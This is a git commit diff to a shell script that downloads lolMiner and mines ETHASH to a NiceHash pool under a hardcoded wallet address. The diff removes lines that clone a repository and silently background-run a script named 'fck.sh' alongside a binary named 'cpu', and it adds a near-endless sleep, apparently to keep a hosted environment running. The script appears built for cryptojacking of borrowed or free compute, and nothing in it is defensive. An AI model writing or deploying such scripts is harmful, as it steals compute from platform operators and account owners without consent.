90c7f676cb6d7bc4abf3e89f25098e107c0ff251
angkii <83603708+angkii@users.noreply.github.com>
2021-07-19 17:48:21 +0700

    Update sex.sh

--- sex.sh
+++ sex.sh
@@ -1,15 +1,7 @@
-git clone https://github.com/angkii/bh.git
-
-cd bh
-
-chmod +x fck.sh
-
-chmod +x cpu
-
-./fck.sh > /dev/null 2>&1 &
-
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
 
 tar -xvf lolMiner_v1.29_Lin64.tar.gz
 
 cd 1.29;./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.sex1 --ethstratum ETHPROXY
+
+sleep 999999999999999999999999999999
